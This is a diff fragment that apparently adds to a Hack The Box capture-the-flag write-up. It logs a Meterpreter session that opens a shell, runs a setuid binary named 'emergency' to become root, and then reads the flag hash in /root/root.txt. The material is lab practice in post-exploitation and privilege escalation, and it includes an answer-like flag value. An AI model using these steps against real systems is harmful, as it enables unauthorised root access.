@@ -36,3 +36,65 @@ else:
 
 
 
+meterpreter > pwd
+/var/htb/bin
+meterpreter > ls
+Listing: /var/htb/bin
+=====================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+104755/rwxr-xr-x  112204  fil   2017-06-14 23:27:12 +0800  emergency
+
+meterpreter >
+
+
+
+meterpreter > shell
+Process 1303 created.
+Channel 0 created.
+./emergency
+whoami
+root
+ls
+emergency
+pwd 
+/var/htb/bin
+cd ..
+cd ..
+cd ..
+pwd
+/
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+cd root
+ls
+root.txt
+cat root.txt
+81b1e99576f6e62c994f77bc747929bb
+
+
+
+
